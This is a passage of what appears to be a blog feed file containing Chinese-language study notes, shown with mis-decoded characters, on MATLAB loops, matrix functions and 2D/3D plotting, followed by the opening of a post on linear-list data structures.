Âæ™ÁéØ</h2><blockquote><p>ÈÄöËøá‰∏ÄÊÆµ‰ª£Á†ÅÊù•Áõ¥Êé•ÁúãÁúãmatlabÁöÑforÂæ™ÁéØÊúâ‰ªÄ‰πà‰∏ç‰∏ÄÊ†∑Ôºö</p></blockquote><pre class=" language-matlab"><code class="language-matlab">nsamples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>npoints <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% matlab ÁöÑ forÂæ™ÁéØÊòØ for i=n:m ÁöÑÂΩ¢ÂºèÔºåËåÉÂõ¥‰∏∫nÂà∞mÔºåÈúÄË¶ÅÁî®endÂÖ≥ÈîÆËØçË°®Á§∫ÁªìÊùü</span><span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>nsamples   iterationString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Iteration #'</span><span class="token punctuation">,</span><span class="token function">int2str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">%dispÁ±ª‰ººprintf Áî®‰∫éÊâìÂç∞ËØ≠Âè•</span>   <span class="token function">disp</span><span class="token punctuation">(</span>iterationString<span class="token punctuation">)</span>   currentData <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>npoints<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">sampleMean</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>currentData<span class="token punctuation">)</span><span class="token keyword">end</span>overallMean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>sampleMean<span class="token punctuation">)</span></code></pre><blockquote><p>ÊïàÊûúÂõæÂ¶Ç‰∏ãÔºö</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe048ca9c1b.png" alt=""></div><blockquote><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºöËÑöÊú¨‰ΩçÁΩÆ</p><blockquote><p>MATLAB Âú®ÁâπÂÆö‰ΩçÁΩÆ‰∏≠Êü•ÊâæËÑöÊú¨ÂèäÂÖ∂‰ªñÊñá‰ª∂„ÄÇË¶ÅËøêË°åËÑöÊú¨ÔºåËØ•Êñá‰ª∂ÂøÖÈ°ª‰Ωç‰∫éÂΩìÂâçÊñá‰ª∂Â§πÊàñ<em>ÊêúÁ¥¢Ë∑ØÂæÑ</em>‰∏≠ÁöÑÊüê‰∏™Êñá‰ª∂Â§πÂÜÖ„ÄÇ</p><p>ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåMATLAB ÂÆâË£ÖÁ®ãÂ∫èÂàõÂª∫ÁöÑ <code>MATLAB</code> Êñá‰ª∂Â§π‰Ωç‰∫éÊ≠§ÊêúÁ¥¢Ë∑ØÂæÑ‰∏≠„ÄÇÂ¶ÇÊûúË¶ÅÂ∞ÜÁ®ãÂ∫èÂ≠òÂÇ®Âú®ÂÖ∂‰ªñÊñá‰ª∂Â§πÔºåÊàñËÄÖË¶ÅËøêË°åÂÖ∂‰ªñÊñá‰ª∂Â§π‰∏≠ÁöÑÁ®ãÂ∫èÔºåËØ∑Â∞ÜÂÖ∂Ê∑ªÂä†Âà∞Ê≠§ÊêúÁ¥¢Ë∑ØÂæÑ„ÄÇÂú®ÂΩìÂâçÊñá‰ª∂Â§πÊµèËßàÂô®‰∏≠ÈÄâ‰∏≠Áõ∏Â∫îÁöÑÊñá‰ª∂Â§πÔºåÂè≥ÈîÆÁÇπÂáªÔºåÁÑ∂ÂêéÈÄâÊã©<strong>Ê∑ªÂä†Âà∞Ë∑ØÂæÑ</strong>„ÄÇ</p></blockquote></blockquote><h2 id="Áî®ÂáΩÊï∞ÁîüÊàêÁü©Èòµ"><a href="#Áî®ÂáΩÊï∞ÁîüÊàêÁü©Èòµ" class="headerlink" title="Áî®ÂáΩÊï∞ÁîüÊàêÁü©Èòµ"></a>Áî®ÂáΩÊï∞ÁîüÊàêÁü©Èòµ</h2><table><thead><tr><th style="text-align:left">ÂáΩÊï∞</th><th>ÁâπÂæÅ</th></tr></thead><tbody><tr><td style="text-align:left">ones</td><td>ÂÖ®ÈÉ®‰∏∫1</td></tr><tr><td style="text-align:left">rand</td><td>ÂùáÂåÄÂàÜÂ∏ÉÁöÑÈöèÊú∫ÂÖÉÁ¥†</td></tr><tr><td style="text-align:left">randn</td><td>Ê≠£ÊÄÅÂàÜÂ∏ÉÁöÑÈöèÊú∫ÂÖÉÁ¥†</td></tr><tr><td style="text-align:left">zeros</td><td>ÂÖ®ÈÉ®‰∏∫0</td></tr><tr><td style="text-align:left">magic</td><td>ÂàõÂª∫Âá†‰πé‰ªªÊÑèÂ§ßÂ∞èÁöÑÂπªÊñπÁü©Èòµ</td></tr></tbody></table><h2 id="Êü•ÁúãÂ∏ÆÂä©"><a href="#Êü•ÁúãÂ∏ÆÂä©" class="headerlink" title="Êü•ÁúãÂ∏ÆÂä©"></a>Êü•ÁúãÂ∏ÆÂä©</h2><blockquote><p>ÊâÄÊúâ MATLABÂáΩÊï∞ÈÉΩÊúâËæÖÂä©ÊñáÊ°£ÔºåËøô‰∫õÊñáÊ°£ÂåÖÂê´‰∏Ä‰∫õÁ§∫‰æãÔºåÂπ∂‰ªãÁªçÂáΩÊï∞ËæìÂÖ•„ÄÅËæìÂá∫ÂíåË∞ÉÁî®ËØ≠Ê≥ï„ÄÇ‰ªéÂëΩ‰ª§Ë°åËÆøÈóÆÊ≠§‰ø°ÊÅØÊúâÂ§öÁßçÊñπÊ≥ïÔºåÂ¶Ç‰∏ãÂõæÔºö</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0593a6722.png" alt=""></div><blockquote><p>‰ªäÊó•Âà∞Ê≠§„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Êï∞Â≠¶Âª∫Ê®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êï∞Ê®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞Â≠¶Âª∫Ê®°-day3</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞Â≠¶Âª∫Ê®°-day3-matlab-Âü∫Êú¨Áî®Ê≥ï"><a href="#Êï∞Â≠¶Âª∫Ê®°-day3-matlab-Âü∫Êú¨Áî®Ê≥ï" class="headerlink" title="Êï∞Â≠¶Âª∫Ê®°_day3 - matlab Âü∫Êú¨Áî®Ê≥ï"></a>Êï∞Â≠¶Âª∫Ê®°_day3 - matlab Âü∫Êú¨Áî®Ê≥ï</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; day3 ÁªßÁª≠ day2ÁöÑ matlab Âü∫Êú¨Áî®Ê≥ïÂ≠¶‰π†Ôºå‰ªäÂ§©Â≠¶‰π†Êï∞Â≠¶Ê®°ÂûãÁªòÂõæÔºåmatlabÁöÑÁªòÂõæÂäüËÉΩÂçÅÂàÜÂº∫Â§ßÔºåÂêÑÁßçÂäüËÉΩÂ¶Ç‰∏ãÂõæ„ÄÇ</p><p><img src="https://i.loli.net/2018/10/08/5bbaf8f1ec8e8.png" alt=""></p><h2 id="ÂÖ≠-Ê†πÊçÆÊù°‰ª∂ÊûÑÂª∫‰∫åÁª¥ÂõæÂíå‰∏âÁª¥ÂõæÂÉè"><a href="#ÂÖ≠-Ê†πÊçÆÊù°‰ª∂ÊûÑÂª∫‰∫åÁª¥ÂõæÂíå‰∏âÁª¥ÂõæÂÉè" class="headerlink" title="ÂÖ≠. Ê†πÊçÆÊù°‰ª∂ÊûÑÂª∫‰∫åÁª¥ÂõæÂíå‰∏âÁª¥ÂõæÂÉè"></a>ÂÖ≠. Ê†πÊçÆÊù°‰ª∂ÊûÑÂª∫‰∫åÁª¥ÂõæÂíå‰∏âÁª¥ÂõæÂÉè</h2><h3 id="plot-ÂáΩÊï∞-‚Äì-‰∫åÁª¥"><a href="#plot-ÂáΩÊï∞-‚Äì-‰∫åÁª¥" class="headerlink" title="plot ÂáΩÊï∞ ‚Äì ‰∫åÁª¥"></a>plot ÂáΩÊï∞ ‚Äì ‰∫åÁª¥</h3><p> &nbsp; &nbsp; &nbsp; ÂàõÂª∫‰∫åÁª¥Á∫øÂõæÈ¶ñÂÖàÈúÄË¶ÅÊûÑÂª∫‰∏Ä‰∏™‰∫åÁª¥ÁöÑÂáΩÊï∞ÔºåÊØîÂ¶ÇÂ∏∏ËßÅÁöÑ y = sin(x)Ôºåy = 2*xÔºåy = 2^x„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ÂèØ‰ª•ÈÄöËøá‰ª•‰∏ã‰ª£Á†ÅÂÆö‰πây = sin(x)ÂáΩÊï∞:</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span>ÂàõÂª∫‰∏Ä‰∏™<span class="token operator">-</span><span class="token number">100</span>Âà∞<span class="token number">100</span>Ê≠•Èïø‰∏∫<span class="token number">10</span>ÁöÑ‰∏ÄÁª¥Êï∞ÁªÑÁî®Êù•‰Ωú‰∏∫Xy <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">/</span><span class="token operator">/</span>ÊûÑÊàêÂáΩÊï∞ y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p><code>ÊàêÂìÅÂõæÂ¶Ç‰∏ã</code>Ôºö</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae75ed9328.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; Âõ†‰∏∫Ê≠•ÈïøÁöÑÂÖ≥Á≥ªÈÄ†Êàê‰∫ÜËøôÂº†ÂõæÁâáÁöÑÁã∞ÁãûÔºå‰∏çËøáÊ≤°ÂÖ≥Á≥ªÔºåÊàë‰ª¨ÂèØ‰ª•Êîπ‰∏Ä‰∏ãxÁöÑËåÉÂõ¥Ôºö</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>ÊîπÊàêÂçï‰ΩçÂúÜËåÉÂõ¥y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></code></pre><p><code>ÊàêÂìÅÂõæÂ¶Ç‰∏ã</code>Ôºö</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae85f7aa9f.png" alt=""><br><br></div><h3 id="surf-Âíå-mesh-ÂáΩÊï∞-‚Äì-‰∏âÁª¥"><a href="#surf-Âíå-mesh-ÂáΩÊï∞-‚Äì-‰∏âÁª¥" class="headerlink" title="surf Âíå mesh ÂáΩÊï∞ ‚Äì ‰∏âÁª¥"></a>surf Âíå mesh ÂáΩÊï∞ ‚Äì ‰∏âÁª¥</h3><p> &nbsp; &nbsp; &nbsp; ‰∏âÁª¥ÂõæÈÄöÂ∏∏ÊòæÁ§∫‰∏Ä‰∏™Áî±Â∏¶‰∏§‰∏™ÂèòÈáèÁöÑÂáΩÊï∞ÔºàÂç≥ <em>z = f (x,y</em>)ÔºâÂÆö‰πâÁöÑÊõ≤Èù¢Âõæ„ÄÇ surf ÂáΩÊï∞ÂèäÂÖ∂‰º¥ÈöèÂáΩÊï∞ mesh ‰ª•‰∏âÁª¥ÂΩ¢ÂºèÊòæÁ§∫Êõ≤Èù¢Âõæ„ÄÇsurf ‰ΩøÁî®È¢úËâ≤ÊòæÁ§∫Êõ≤Èù¢ÂõæÁöÑËøûÊé•Á∫øÂíåÈù¢„ÄÇmesh ÁîüÊàê‰ªÖ‰ª•È¢úËâ≤Ê†áËÆ∞ËøûÊé•ÂÆö‰πâÁÇπÁöÑÁ∫øÊù°ÁöÑÁ∫øÊ°ÜÊõ≤Èù¢Âõæ„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ‰æãÂ¶ÇÂú®‰∏âÁª¥ÂùêÊ†áÁ≥ª‰∏≠ÔºåÊûÑÂª∫‰∏Ä‰∏™ Z=1Ôºå-1&lt;x&lt;1Ôºå-1&lt;y&lt;1ÔºåÁöÑÂπ≥Èù¢ÔºåÊàë‰ª¨Ë¶ÅËæìÂÖ•‰ª•‰∏ã‰ª£Á†ÅÔºö</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">=</span> x<span class="token punctuation">;</span>z <span class="token operator">=</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>ÊàêÂìÅÂõæÂ¶Ç‰∏ã</code>Ôºö</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf6e837e65.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; expÂáΩÊï∞Ôºå‰æãÂ¶Çexp(5)‰ª£Ë°®ÁöÑÊòØe^5„ÄÇË¶ÅËÆ°ÁÆó <em>z</em>ÔºåËØ∑È¶ñÂÖà‰ΩøÁî® <code>meshgrid</code> Âú®Â∞ÜË¶ÅÂàõÂª∫ÁöÑ‰∏âÁª¥ÂáΩÊï∞ÁöÑÂüü‰∏≠ÂàõÂª∫‰∏ÄÁªÑ (<em>x,y</em>) ÁÇπ„ÄÇ Ôºö</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">meshgrid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>ÂàõÂª∫<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>ÁÇπZ <span class="token operator">=</span> X <span class="token operator">.*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>X<span class="token operator">.^</span><span class="token number">2</span> <span class="token operator">-</span> Y<span class="token operator">.^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>ÂæóÂà∞Z<span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span>Ôºõ                <span class="token operator">/</span><span class="token operator">/</span>ÁîªÂõæ</code></pre><p><code>ÊàêÂìÅÂõæÂ¶Ç‰∏ã</code>Ôºö</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf9b2535a5.png" alt=""></div><h3 id="cylinder-Âíå-subplot-ÂáΩÊï∞"><a href="#cylinder-Âíå-subplot-ÂáΩÊï∞" class="headerlink" title="cylinder Âíå subplot ÂáΩÊï∞"></a>cylinder Âíå subplot ÂáΩÊï∞</h3><p> &nbsp; &nbsp; &nbsp; cylinderÈÄöÂ∏∏Áî®‰∫éÁîüÊàêÂúÜÊü±Ê®°ÂûãÂπ∂ËøîÂõûxÔºåyÔºåzÂùêÊ†áÂÄºÔºåsubplotÈÄöÂ∏∏Áî®‰∫éÂàÜÂâ≤Á™óÂè£Áî®‰ª•ÊòæÁ§∫‰∏çÂêåÁöÑÂõæÂΩ¢„ÄÇ</p><pre class=" language-matlab"><code class="language-matlab">Matlab cylinder ÂáΩÊï∞Ôºö„ÄÄ„ÄÄ<span class="token number">1</span>„ÄÅcylinderÂáΩÊï∞ÂäüËÉΩËØ¥ÊòéÔºöÁªòÂà∂‰∏âÁª¥ÂúÜÊü±Âõæ„ÄÇ„ÄÄ„ÄÄ<span class="token number">2</span>„ÄÅcylinderÂáΩÊï∞Áî®Ê≥ïËØ¥ÊòéÔºö„ÄÄ„ÄÄÔºà<span class="token number">1</span>Ôºâ<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span>cylinder ÂáΩÊï∞ËøîÂõû‰∏ÄÂçäÂæÑÂíåÈ´òÂ∫¶ÈÉΩ‰∏∫<span class="token number">1</span>ÁöÑÂúÜÊü±‰ΩìxÔºåyÔºåzËΩ¥ÁöÑÂùêÊ†áÂÄºÔºåÂúÜÊü±‰ΩìÊ≤øÂÖ∂Âë®ÈïøÊúâ<span class="token number">20</span>‰∏™Á≠âË∑ùÂàÜÂ∏ÉÁöÑÁÇπÔºõ„ÄÄ„ÄÄÔºà<span class="token number">2</span>Ôºâ<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> ÂáΩÊï∞‰∏Ä‰∏™ÂçäÂæÑ‰∏∫r„ÄÅÈ´òÂ∫¶‰∏∫<span class="token number">1</span>ÁöÑÂúÜÊü±‰ΩìÁöÑxÔºåyÔºåzËΩ¥ÁöÑÂùêÊ†áÂÄºÔºåÂúÜÊü±‰ΩìÊ≤øÂÖ∂Âë®ÈïøÊúâ<span class="token number">20</span>‰∏™Á≠âË∑ùÂàÜÂ∏ÉÁöÑÁÇπÔºõ„ÄÄ„ÄÄÔºà<span class="token number">3</span>Ôºâ<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">)</span> ÂáΩÊï∞‰∏Ä‰∏™ÂçäÂæÑ‰∏∫r„ÄÅÈ´òÂ∫¶‰∏∫<span class="token number">1</span>ÁöÑÂúÜÊü±‰ΩìÁöÑxÔºåyÔºåzËΩ¥ÁöÑÂùêÊ†áÂÄºÔºåÂúÜÊü±‰ΩìÊ≤øÂÖ∂Âë®ÈïøÊúân‰∏™Á≠âË∑ùÂàÜÂ∏ÉÁöÑÁÇπÔºõ„ÄÄ„ÄÄÔºà<span class="token number">4</span>Ôºâ<span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span> ÂáΩÊï∞Âè™ÁªòÂà∂ÂúÜÊü±ÔºåÊ≤°Êúâ‰ªª‰ΩïÁöÑËæìÂá∫ÂèÇÈáè„ÄÇÂÖ∂‰ªñÂèÇÈáèÂèäÁªìÊûúÂêå‰∏ä„ÄÇ</code></pre><p> &nbsp; &nbsp; &nbsp; Áî®‰∏Ä‰∏™‰æãÂ≠êÊù•Â±ïÁ§∫‰∏Ä‰∏ãcylinderÂíåsubplotÁöÑÁî®Ê≥ïÔºö</p><pre class=" language-matlab"><code class="language-matlab">t <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X,Y,Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>ÊàêÂìÅÂõæÂ¶Ç‰∏ã</code>Ôºö</p><div align="center"><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/08/5bbafba7df128.png" class="lazyload"></div>]]></content>
      
      
      <categories>
          
          <category> Êï∞Â≠¶Âª∫Ê®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Êï∞Ê®° </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-ÔºàAlgorithmÔºâ-Á∫øÊÄßÁªìÊûÑ"><a href="#Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï-ÔºàAlgorithmÔºâ-Á∫øÊÄßÁªìÊûÑ" class="headerlink" title="Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï ÔºàAlgorithmÔºâ- Á∫øÊÄßÁªìÊûÑ"></a>Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ï ÔºàAlgorithmÔºâ- Á∫øÊÄßÁªìÊûÑ</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; Á∫øÊÄßÁªìÊûÑÁöÑÂü∫Êú¨ÁâπÂæÅÊòØÔºöÂú®Êï∞ÊçÆÂÖÉÁ¥†ÁöÑÈùûÁ©∫ÊúâÈôêÈõÜ‰∏≠ÔºåÊúâ‰∏î‰ªÖÊúâ‰∏Ä‰∏™ÂÖÉÁ¥†Ê≤°ÊúâÂâçÈ©±ÔºåÊúâ‰∏î‰ªÖÊúâ‰∏Ä‰∏™Êï∞ÊçÆÂÖÉÁ¥†Ê≤°ÊúâÂêéÁªßÔºõÂÖ∂‰ΩôÊï∞ÊçÆÂÖÉÁ¥†Êúâ‰∏î‰ªÖÊúâÂè™Êúâ‰∏Ä‰∏™Áõ¥Êé•ÁöÑÂâçÈ©±ÂíåÂêéÁªß„ÄÇ</p><pre class=" language-c"><code class="language-c">‰æãÂ¶Ç<span class="token punctuation">:</span>   <span class="token operator">*</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">*</span></code></pre><h2 id="Á∫øÊÄßË°®"><a href="#Á∫øÊÄßË°®" class="headerlink" title="Á∫øÊÄßË°®"></a>Á∫øÊÄßË°®</h2><p> &nbsp; &nbsp; &nbsp; Á∫øÊÄßË°®ÊòØÁî±Âêå‰∏ÄÁ±ªÂûãÁöÑÊï∞ÊçÆÂÖÉÁ¥†ÊûÑÊàêÁöÑÁ∫øÊÄßÁªìÊûÑÔºåÁâπÁÇπÊòØÔºöÊï∞ÊçÆÂÖÉÁ¥†Èó¥Âëà‰∏ÄÁßçÁ∫øÊÄßÂÖ≥Á≥ª„ÄÇÁ∫øÊÄßË°®ÊòØÂÖ∑ÊúâÁõ∏ÂêåÊï∞ÊçÆÁ±ªÂûãÁöÑn‰∏™Êï∞ÊçÆÂÖÉÁ¥†ÁöÑÊúâÈôêÂ∫èÂàóÔºåÈÄöÂ∏∏ËÆ∞‰∏∫Ôºö</p><p>Ôºàa1Ôºåa2Ôºåa3Ôºå¬∑¬∑¬∑¬∑¬∑¬∑Ôºåa(i-1)ÔºåaiÔºåa(i+1)Ôºå¬∑¬∑¬∑¬∑¬∑¬∑ÔºåanÔºâ</p><p><code>Á∫øÊÄßË°®ÊäΩË±°Êï∞ÊçÆÁ±ªÂûã</code>Ôºö</p><pre class=" language-c"><code class="language-c">ADT List<span class="token punctuation">{</span>Êï∞ÊçÆÂØπË±°<span class="token punctuation">:</span> D<span class="token operator">=</span><span class="token punctuation">{</span>ai<span class="token operator">|</span> <span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span>ElemSet<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">}</span>Êï∞ÊçÆÂÖ≥Á≥ª<span class="token punctuation">:</span> R1<span class="token operator">=</span><span class="token punctuation">{</span>i<span class="token number">-1</span><span class="token punctuation">,</span>ai<span class="token operator">></span><span class="token operator">|</span> ai<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span> D<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">}</span>Âü∫Êú¨Êìç‰ΩúÔºö<span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//ÂàùÂßãÂåñ</span><span class="token function">DestroyList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//Âà†Èô§</span><span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//ÊèíÂÖ•</span><span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//Âà†Èô§ÊåáÂÆöÂÖÉÁ¥†</span><span class="token punctuation">}</span>ADT List</code></pre><p>Á∫øÊÄßË°®Êúâ‰∏§ÁßçÂ≠òÂÇ®ÁªìÊûÑÔºö</p><p> &nbsp; &nbsp; &nbsp; ‚ë†ÂÆöÈïøÁöÑÈ°∫Â∫èÂ≠òÂÇ®ÁªìÊûÑ‚Äî‚ÄîÂêëÈáèÂûãÁöÑ‰∏ÄÁª¥Êï∞ÁªÑÁªìÊûÑ</p><p> &nbsp; &nbsp; &nbsp; 